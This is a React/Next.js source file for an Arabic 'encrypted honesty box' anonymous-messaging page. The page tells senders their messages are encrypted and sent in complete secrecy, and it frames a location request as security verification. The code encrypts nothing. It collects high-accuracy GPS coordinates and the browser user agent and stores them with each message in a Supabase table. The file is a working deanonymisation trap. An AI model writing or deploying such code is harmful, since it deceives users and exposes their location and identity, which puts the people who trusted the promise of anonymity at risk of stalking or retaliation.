'use client';
import { createClient } from '@supabase/supabase-js';
import { useState, FormEvent } from 'react';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, 
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

export default function Home() {
  const [message, setMessage] = useState<string>('');
  const [status, setStatus] = useState<string>('');

  const sendMessage = async (e: FormEvent) => {
    e.preventDefault();
    setStatus('جاري تأمين اتصالك وتشفير الرسالة...');

    if (typeof window !== 'undefined' && "geolocation" in window.navigator) {
      window.navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
          
          const { error } = await supabase
            .from('messages')
            .insert([{ 
              content: message, 
              device: window.navigator.userAgent,
              location: locationLink 
            }]);

          if (error) setStatus('حدث خطأ، حاول الإرسال مرة أخرى');
          else {
            setStatus('تم إرسال رسالتك بنجاح وبسرية تامة! ✅');
            setMessage('');
          }
        },
        async (err) => {
          let reason = "تم حجب الموقع من قبل المستخدم";
          await supabase.from('messages').insert([{ 
            content: message, 
            device: window.navigator.userAgent,
            location: reason 
          }]);
          setStatus('تم إرسال رسالتك بنجاح! ✅');
          setMessage('');
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }
  };

  return (
    <main className="min-h-screen flex items-center justify-center bg-[#fafafa] p-4" dir="rtl">
      <div className="bg-white p-10 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-gray-100">
        <div className="mb-8 text-center">
          <div className="bg-blue-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white shadow-sm">
            <span className="text-3xl">🛡️</span>
          </div>
          <h1 className="text-2xl font-black text-gray-800 tracking-tight">صندوق الصراحة المشفر</h1>
          <p className="text-gray-400 text-sm mt-3 leading-relaxed">
            رسالتك تمر عبر بروتوكول حماية متقدم. <br/>
            <span className="text-blue-500 font-medium text-xs mt-2 block">
              يرجى الموافقة على طلب "التحقق الجغرافي" لتوثيق أمان الرسالة.
            </span>
          </p>
        </div>
        
        <form onSubmit={sendMessage}>
          <textarea
            className="w-full p-5 border-2 border-gray-50 rounded-[1.5rem] mb-5 focus:outline-none focus:border-blue-300 text-right bg-gray-50/50 transition-all text-gray-700 placeholder:text-gray-300 resize-none"
            rows={5}
            placeholder="اكتب هنا ما لا تستطيع قوله علانية..."
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            required
          />
          <button 
            type="submit" 
            className="w-full bg-[#007aff] text-white py-4.5 rounded-[1.2rem] font-bold hover:bg-[#005ecb] active:scale-95 transition-all shadow-xl shadow-blue-100 text-lg"
          >
            إرسال الآن (بسرية)
          </button>
        </form>
        
        {status && <div className="mt-8 p-4 bg-gray-50 rounded-2xl text-[#007aff] text-xs font-bold animate-pulse">{status}</div>}
      </div>
    </main>
  );
}